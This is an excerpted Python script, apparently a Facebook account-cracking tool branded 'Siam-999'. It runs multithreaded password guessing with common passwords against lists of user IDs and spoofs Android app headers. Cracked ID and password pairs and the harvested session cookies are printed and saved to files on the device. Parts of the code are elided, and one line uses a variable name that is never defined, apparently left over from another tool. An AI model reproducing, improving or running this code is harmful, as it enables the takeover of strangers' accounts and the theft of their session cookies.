...
from concurrent.futures import ThreadPoolExecutor as Siam
from string import * 
...
os.system('xdg-open https://www.facebook.com/SiamBhau69')
logo =f"""
 ____  _                 
/ ___|(_) __ _ _ __ ___  
\___ \| |/ _` | '_ ` _ \ 
 ___) | | (_| | | | | | |
|____/|_|\__,_|_| |_| |_|\x1b[1;92m[\x1b[1;97mV 6.1\x1b[1;92m

\033[1;32m──────────────────────────────────────────────────
\033[1;32m[\033[1;31m✓\033[1;32m] AUTHOR    : SiamBhau
\033[1;32m[\033[1;31m✓\033[1;32m] GITHUB    : Siam-Bruh
...
def meyexudi():
  ...
  id = '-'.join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Siam-Bruh/Aprooval/blob/main/Aprooval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
...
def _old_():
       ...
       with Siam(max_workers=40) as SIA:
           clear()
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                print(f"\r{R}[{R}Siam-999CP{R}]{R} {uid} | {pw}")
                open("/sdcard/Siam.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          
            	print(f"\r{R}[{G1}Siam-999OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/Siam-999cp.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r{R}[{G1}Siam-999OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/Siam-999ok.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            else:continue
        loop+=1
...
def _bd_():
    ...
    for x in range(limit):
        ...
        user.append(nmp)
    clear()
    with Siam(max_workers=30) as sexy:
        clear()
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} /sdcard/SIAM.txt');linex()
    ...
    def pasw(self):       
            ...
            linex()
            with Siam(max_workers=30) as SIAMworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ...
                                SIAMworld.submit(self.methodE,uid,name, pwx)
                            elif 'methodF' in methods:
                                SIAMworld.submit(self.methodF,uid,name, pwx)
                            elif 'methodG' in methods:
                                SIAMworld.submit(self.methodG,uid,name, pwx)
                   except:pass
            result(oks,cps)          
#__________________[ FILE METHOD M1 ]__________________#             
    def methodA(self,sid,name,psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;93m[\033[0;95mSiam-999M1\033[1;37m] \033[1;33m{loop}\033[1;33m \033[1;34m|\033[1;32m OK\033[1;32m | \033[1;31mCP \033[1;32m[{len(oks)}]\033[1;34m [\033[1;31m {len(cps)}\033[1;34m] \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SIAMgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SIAMgift};{ckkk}"
                    print(f"\r{R} [Siam-999-OK] {sid} | {ps} {S}\n[cookie[🔥]={ckkk}")
                    oks.append(sid)
                    open('/sdcard/Siam-999_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Siam_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [Siam-999-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    #open('/sdcard/Siam-999_CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[Siam-999OK] {sid} | {ps} ")
                #    print(f"\r\r{G1}[COOKIES-💛]>{B}{cookie} ")
                    open('/sdcard/Siam-999M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\r{M}[Siam-999CP] {sid} | {ps} ")
                    open('/sdcard/Siam-999M2-FILE-cp.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SIAMgift = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFgift};{ckkk}"
                    print(f"\r{R} [Siam-999-OK] {sid} | {ps} {S}\n[cookie[🔥]={ckkk}")
                    oks.append(sid)
                    open('/sdcard/Siam-999_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Siam_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SIAMb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SIAMb};{ckkk}"
                print(f'\r\r{R1}[Siam-999OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{R} {cookie}')
                open('/sdcard/Siam-999RNDM-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
                continue
        loop+=1
